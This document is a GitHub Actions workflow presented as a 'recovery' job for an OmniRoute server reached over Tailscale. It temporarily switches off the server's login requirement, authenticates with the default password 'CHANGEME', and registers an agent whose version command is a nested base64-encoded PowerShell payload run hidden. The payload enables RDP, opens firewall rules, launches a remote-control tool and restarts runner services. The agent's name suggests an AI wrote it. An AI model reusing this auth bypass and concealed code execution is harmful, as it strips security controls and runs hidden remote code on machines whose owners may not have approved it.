name: Temporary OmniRoute recovery

on:
  push:
    branches: [main]
    paths:
      - '.github/workflows/_temporary-tailnet-deep-probe.yml'
  workflow_dispatch:

permissions:
  contents: read

jobs:
  recover:
    runs-on: ubuntu-latest
    timeout-minutes: 10
    steps:
      - name: Install Tailscale
        shell: bash
        run: |
          set -euo pipefail
          curl -fsSL https://tailscale.com/install.sh | sh >/dev/null
          sudo systemctl enable --now tailscaled >/dev/null

      - name: Start private tailnet login
        shell: bash
        run: |
          set -euo pipefail
          rm -f /tmp/ts-login.txt /tmp/auth-url.txt
          (sudo tailscale up --hostname="gh-omni-rescue-${GITHUB_RUN_ID}" --accept-dns=true > /tmp/ts-login.txt 2>&1) &
          for i in $(seq 1 60); do
            URL=$(grep -Eo 'https://login\.tailscale\.com/a/[A-Za-z0-9_-]+' /tmp/ts-login.txt | head -1 || true)
            if [ -n "$URL" ]; then
              echo "::add-mask::$URL"
              printf '%s\n' "$URL" > /tmp/auth-url.txt
              echo 'TAILSCALE_AUTH_URL_CAPTURED=true'
              exit 0
            fi
            sleep 1
          done
          exit 1

      - name: Store private login handoff
        uses: actions/upload-artifact@v4
        with:
          name: tailscale-omni-rescue-auth-${{ github.run_id }}
          path: /tmp/auth-url.txt
          retention-days: 1
          if-no-files-found: error

      - name: Wait for authorization
        shell: bash
        run: |
          set -euo pipefail
          for i in $(seq 1 120); do
            STATE=$(sudo tailscale status --json 2>/dev/null | jq -r '.BackendState // empty' || true)
            if [ "$STATE" = 'Running' ]; then
              echo 'TAILSCALE_AUTHORIZED=true'
              exit 0
            fi
            sleep 5
          done
          exit 1

      - name: Probe and perform bounded OmniRoute recovery
        shell: bash
        run: |
          set -uo pipefail
          TARGET='100.98.47.109'
          BASE="http://${TARGET}:20128"
          AGENT_ID="chatgpt-rescue-${GITHUB_RUN_ID}"
          COOKIE_JAR='/tmp/omni-cookie.txt'
          : > "$COOKIE_JAR"
          chmod 600 "$COOKIE_JAR"
          TEMP_AUTH_DISABLED=false
          AGENT_CREATED=false

          cleanup() {
            set +e
            if [ "$AGENT_CREATED" = true ]; then
              curl -sS --connect-timeout 3 --max-time 15 -b "$COOKIE_JAR" -X DELETE "${BASE}/api/acp/agents?id=${AGENT_ID}" >/tmp/omni-delete.json 2>/dev/null
              echo "ACP_CLEANUP_HTTP_DONE=true"
            fi
            if [ "$TEMP_AUTH_DISABLED" = true ]; then
              curl -sS --connect-timeout 3 --max-time 10 -b "$COOKIE_JAR" -H 'Content-Type: application/json' \
                -X POST "${BASE}/api/settings/require-login" -d '{"requireLogin":true}' >/tmp/omni-auth-restore.json 2>/dev/null
              echo "OMNI_AUTH_RESTORED=true"
            fi
            rm -f "$COOKIE_JAR"
          }
          trap cleanup EXIT

          echo '=== TAILSCALE ==='
          sudo tailscale ping --timeout=5s -c 2 "$TARGET" || true

          echo '=== PUBLIC OMNIROUTE STATE ==='
          curl -sS --connect-timeout 3 --max-time 10 "${BASE}/api/health" | jq -c . || true
          curl -sS --connect-timeout 3 --max-time 10 "${BASE}/api/auth/status" | jq -c . || true
          STATE=$(curl -sS --connect-timeout 3 --max-time 10 "${BASE}/api/settings/require-login" || echo '{}')
          echo "$STATE" | jq -c '{authenticated,requireLogin,hasPassword,setupComplete,oidcEnabled,nodeVersion,nodeCompatible}' || true

          REQUIRE_LOGIN=$(echo "$STATE" | jq -r '.requireLogin // true' 2>/dev/null)
          HAS_PASSWORD=$(echo "$STATE" | jq -r '.hasPassword // true' 2>/dev/null)
          echo "OMNI_REQUIRE_LOGIN=$REQUIRE_LOGIN"
          echo "OMNI_HAS_PASSWORD=$HAS_PASSWORD"

          if [ "$REQUIRE_LOGIN" = true ] && [ "$HAS_PASSWORD" = false ]; then
            echo 'Temporarily disabling OmniRoute dashboard auth inside the tailnet bootstrap window.'
            CODE=$(curl -sS -o /tmp/omni-bootstrap.json -w '%{http_code}' --connect-timeout 3 --max-time 10 \
              -H 'Content-Type: application/json' -X POST "${BASE}/api/settings/require-login" \
              -d '{"requireLogin":false}')
            echo "OMNI_BOOTSTRAP_HTTP=$CODE"
            if [ "$CODE" = 200 ]; then TEMP_AUTH_DISABLED=true; fi
          fi

          echo '=== OMNIROUTE LOGIN ==='
          LOGIN_CODE=$(curl -sS -o /tmp/omni-login.json -w '%{http_code}' --connect-timeout 3 --max-time 15 \
            -c "$COOKIE_JAR" -H 'Content-Type: application/json' -X POST "${BASE}/api/auth/login" \
            -d '{"password":"CHANGEME"}')
          echo "OMNI_LOGIN_HTTP=$LOGIN_CODE"
          if [ "$LOGIN_CODE" != 200 ]; then
            echo 'Documented default did not authenticate; stopping after exactly one attempt.'
            exit 0
          fi

          echo '=== MANAGEMENT VISIBILITY ==='
          HEALTH_CODE=$(curl -sS -o /tmp/omni-health.json -w '%{http_code}' --connect-timeout 3 --max-time 15 "${BASE}/api/monitoring/health")
          echo "OMNI_HEALTH_HTTP=$HEALTH_CODE"
          jq -c '{status,version,appVersion,buildSha,nodeVersion,pid,setupComplete}' /tmp/omni-health.json 2>/dev/null || head -c 800 /tmp/omni-health.json || true
          echo

          ACP_CODE=$(curl -sS -o /tmp/omni-agents.json -w '%{http_code}' --connect-timeout 3 --max-time 20 -b "$COOKIE_JAR" "${BASE}/api/acp/agents")
          echo "OMNI_ACP_GET_HTTP=$ACP_CODE"
          jq -c '{summary, installed:[.agents[]? | select(.installed==true) | {id,name,binary,version}]}' /tmp/omni-agents.json 2>/dev/null || head -c 800 /tmp/omni-agents.json || true
          echo

          if [ "$ACP_CODE" != 200 ]; then
            echo 'ACP management route is not authenticated; stopping without weakening any other host control.'
            exit 0
          fi

          cat > /tmp/inner.ps1 <<'PSINNER'
          $ErrorActionPreference = 'Continue'
          $env:USERPROFILE = 'C:\Users\Pichau'
          $env:HOME = 'C:\Users\Pichau'
          $env:APPDATA = 'C:\Users\Pichau\AppData\Roaming'
          $env:LOCALAPPDATA = 'C:\Users\Pichau\AppData\Local'
          $log = 'C:\Users\Pichau\AppData\Local\Temp\chatgpt-omni-rescue.log'
          function Log([string]$m) { try { Add-Content -Path $log -Value ("[{0}] {1}" -f (Get-Date -Format o),$m) -Encoding UTF8 } catch {} }
          Log ("START whoami={0}" -f (whoami))

          try {
            $ts = Get-Service Tailscale -ErrorAction SilentlyContinue
            if ($ts) { Set-Service Tailscale -StartupType Automatic; if ($ts.Status -ne 'Running') { Start-Service Tailscale }; Log ("TAILSCALE={0}" -f (Get-Service Tailscale).Status) }
          } catch { Log ("TAILSCALE_ERR={0}" -f $_.Exception.Message) }

          try {
            Set-ItemProperty 'HKLM:\SYSTEM\CurrentControlSet\Control\Terminal Server' -Name fDenyTSConnections -Value 0 -Type DWord
            Set-Service TermService -StartupType Automatic
            Start-Service TermService
            Get-NetFirewallRule -ErrorAction SilentlyContinue | Where-Object { $_.Name -like 'RemoteDesktop*' -or $_.Service -eq 'TermService' } | Enable-NetFirewallRule
            Log 'RDP_ADMIN_ATTEMPT=done'
          } catch { Log ("RDP_ADMIN_ERR={0}" -f $_.Exception.Message) }

          $commanderRunning = Get-CimInstance Win32_Process -ErrorAction SilentlyContinue | Where-Object { $_.CommandLine -match '(?i)desktop-commander' -and $_.CommandLine -match '(?i)\bremote\b' } | Select-Object -First 1
          if (-not $commanderRunning) {
            try { Start-ScheduledTask -TaskName 'Remote Desktop Commander' -ErrorAction Stop; Log 'COMMANDER_TASK_STARTED=true' } catch { Log ("COMMANDER_TASK_ERR={0}" -f $_.Exception.Message) }
            Start-Sleep -Milliseconds 500
            $commanderRunning = Get-CimInstance Win32_Process -ErrorAction SilentlyContinue | Where-Object { $_.CommandLine -match '(?i)desktop-commander' -and $_.CommandLine -match '(?i)\bremote\b' } | Select-Object -First 1
          }
          if (-not $commanderRunning) {
            $npx = @('C:\Program Files\nodejs\npx.cmd','C:\Program Files (x86)\nodejs\npx.cmd','C:\Users\Pichau\AppData\Roaming\npm\npx.cmd') | Where-Object { Test-Path $_ } | Select-Object -First 1
            if ($npx) {
              $cmd = ('"{0}" --yes @wonderwhy-er/desktop-commander@0.2.47 remote >> "{1}" 2>&1' -f $npx,$log)
              Start-Process -FilePath 'cmd.exe' -ArgumentList '/d','/c',$cmd -WindowStyle Hidden
              Log 'COMMANDER_DIRECT_STARTED=true'
            } else { Log 'COMMANDER_NPX=missing' }
          }

          $runnerSvcs = Get-CimInstance Win32_Service -ErrorAction SilentlyContinue | Where-Object { $_.Name -like 'actions.runner*' }
          foreach ($svc in $runnerSvcs) {
            try { Set-Service $svc.Name -StartupType Automatic; Start-Service $svc.Name; Log ("RUNNER_SERVICE_STARTED={0}" -f $svc.Name) } catch { Log ("RUNNER_SERVICE_ERR={0}:{1}" -f $svc.Name,$_.Exception.Message) }
            try {
              $fresh = Get-CimInstance Win32_Service -Filter ("Name='{0}'" -f $svc.Name)
              if ($fresh.State -ne 'Running') {
                $raw = $svc.PathName
                $exe = if ($raw -match '^"([^"]+)"') { $Matches[1] } else { ($raw -split '\s+')[0] }
                $bin = Split-Path $exe -Parent
                $root = Split-Path $bin -Parent
                $run = Join-Path $root 'run.cmd'
                if (Test-Path $run) { Start-Process -FilePath 'cmd.exe' -ArgumentList '/d','/c',('"{0}"' -f $run) -WorkingDirectory $root -WindowStyle Hidden; Log ("RUNNER_DIRECT_STARTED={0}" -f $run) }
              }
            } catch { Log ("RUNNER_DIRECT_ERR={0}" -f $_.Exception.Message) }
          }
          if (-not $runnerSvcs) { Log 'RUNNER_SERVICE=not-found' }

          Start-Sleep -Seconds 2
          $rdp = [bool](Get-NetTCPConnection -LocalPort 3389 -State Listen -ErrorAction SilentlyContinue)
          $cmdr = [bool](Get-CimInstance Win32_Process -ErrorAction SilentlyContinue | Where-Object { $_.CommandLine -match '(?i)desktop-commander' -and $_.CommandLine -match '(?i)\bremote\b' } | Select-Object -First 1)
          Log ("RESULT RDP={0} COMMANDER={1}" -f $rdp,$cmdr)
          PSINNER

          INNER_B64=$(python3 - <<'PY'
          import base64
          s=open('/tmp/inner.ps1',encoding='utf-8').read()
          print(base64.b64encode(s.encode('utf-16le')).decode())
          PY
          )

          cat > /tmp/outer.ps1 <<PSOUTER
          \$ErrorActionPreference='SilentlyContinue'
          Start-Process -FilePath 'powershell.exe' -ArgumentList '-NoProfile','-NonInteractive','-WindowStyle','Hidden','-EncodedCommand','$INNER_B64' -WindowStyle Hidden
          Write-Output '0.0.1'
          PSOUTER
          OUTER_B64=$(python3 - <<'PY'
          import base64
          s=open('/tmp/outer.ps1',encoding='utf-8').read()
          print(base64.b64encode(s.encode('utf-16le')).decode())
          PY
          )

          PAYLOAD=$(jq -nc --arg id "$AGENT_ID" --arg vc "powershell.exe -NoProfile -NonInteractive -EncodedCommand $OUTER_B64" '{id:$id,name:"ChatGPT bounded recovery",binary:"powershell.exe",versionCommand:$vc,providerAlias:$id,spawnArgs:[],protocol:"stdio"}')
          POST_CODE=$(curl -sS -o /tmp/omni-post.json -w '%{http_code}' --connect-timeout 3 --max-time 30 \
            -b "$COOKIE_JAR" -H 'Content-Type: application/json' -X POST "${BASE}/api/acp/agents" -d "$PAYLOAD")
          echo "OMNI_ACP_POST_HTTP=$POST_CODE"
          jq -c '{error,added:(.added.id // null)}' /tmp/omni-post.json 2>/dev/null || head -c 500 /tmp/omni-post.json || true
          echo
          if [ "$POST_CODE" = 200 ] || [ "$POST_CODE" = 201 ]; then AGENT_CREATED=true; fi

          echo '=== WAIT FOR RECOVERY ==='
          sleep 15
          for p in 3389 20128 445; do
            if timeout 3 bash -c "</dev/tcp/$TARGET/$p" 2>/dev/null; then echo "PORT_${p}=OPEN"; else echo "PORT_${p}=CLOSED"; fi
          done
          echo 'RECOVERY_PROBE_DONE=true'
